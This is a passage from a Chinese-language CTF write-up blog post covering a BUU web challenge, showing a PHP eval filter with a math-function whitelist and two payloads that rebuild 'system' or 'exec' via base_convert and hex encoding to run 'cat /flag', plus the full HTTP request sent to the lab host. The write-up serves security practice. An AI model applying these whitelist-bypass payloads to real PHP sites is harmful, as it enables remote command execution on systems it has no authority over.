</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的字符&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的函数&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//帮你算出答案
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>第一种payload构造方法：<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></p>
<div class="highlight" id="id-34"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">base_convert</span><span class="p">(</span><span class="mi">37907361743</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="s2">&#34;hex2bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">dechex</span><span class="p">(</span><span class="mi">1598506324</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="s2">&#34;5f474554&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pi</span><span class="o">=</span><span class="nx">hex2bin</span><span class="p">(</span><span class="s2">&#34;5f474554&#34;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nv">$pi</span><span class="o">=</span><span class="s2">&#34;_GET&#34;</span>   <span class="c1">//hex2bin将一串16进制数转换为二进制字符串
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">(</span><span class="nv">$$pi</span><span class="p">){</span><span class="nx">pi</span><span class="p">}((</span><span class="nv">$$pi</span><span class="p">){</span><span class="nx">abs</span><span class="p">})</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">){</span><span class="nx">pi</span><span class="p">}(</span><span class="nv">$_GET</span><span class="p">){</span><span class="nx">abs</span><span class="p">}</span>  <span class="c1">//{}可以代替[]
</span></span></span></code></pre></div><p>第二种payload：<code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p>
<pre tabindex="0"><code>base_convert(696468,10,36) =&gt; &#34;exec&#34;
$pi(8768397090111664438,10,30) =&gt; &#34;getallheaders&#34;
exec(getallheaders(){1})
操作的base_convert和(696468,10,36)都可以输出，中间用逗号隔开</code></pre><div class="highlight" id="id-36"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">5f45c01f-ba8f-4226-b257-a443769cc63f.node4.buuoj.cn:81</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
</span></span><span class="line"><span class="cl"><span class="n">1</span><span class="o">:</span> <span class="l">cat /flag</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2021-09-12 00:00:00">更新于 2021-09-12&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/buu-web-0x20-0x2f/" data-title="BUU_WEB刷题_0x20-0x2F" data-hashtags="WEB"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/buu-web-0x20-0x2f/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/buu-web-0x20-0x2f/" data-title="BUU_WEB刷题_0x20-0x2F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="标签 - WEB">WEB</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/" class="post-nav-item" rel="prev" title="Tcache_stashing_unlink_atack调试记录"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Tcache_stashing_unlink_atack调试记录</a>
      <a href="/posts/buu-web-0x30-0x3f/" class="post-nav-item" rel="next" title="BUU_WEB刷题_0x30-0x3F">BUU_WEB刷题_0x30-0x3F<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
